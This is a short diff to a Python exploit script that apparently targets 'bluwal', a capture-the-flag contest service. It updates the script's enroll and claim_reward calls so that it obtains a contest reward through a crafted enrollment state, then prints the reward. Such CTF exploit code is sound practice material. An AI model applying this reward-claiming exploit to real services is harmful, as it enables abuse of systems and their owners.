@@ -1,8 +1,10 @@
 #!/usr/bin/env python3
 
 import sys
+import uuid
 
 from bluwal_lib import SploitMachine
+from proto.bluwal.bluwal_pb2 import EnrollmentFilter
 
 
 def attack(host: str, contest_id: str):
@@ -20,10 +22,11 @@ def attack(host: str, contest_id: str):
 
     assert varint_first_byte < 208, "checker should not create such a contest"
 
+    user_id = str(uuid.uuid4())
     initial = list(contest.threshold) + [0] * (128 - len(contest.threshold))
-    enrollment_id = sm.enroll(stub, contest_id, initial)
+    enrollment_filter = sm.enroll(stub, EnrollmentFilter(user_id=user_id, contest_id=contest_id, current_state=initial))
 
-    reward = sm.claim_reward(stub, contest_id, enrollment_id)
+    reward = sm.claim_reward(stub, enrollment_filter)
     print(reward)
 
 
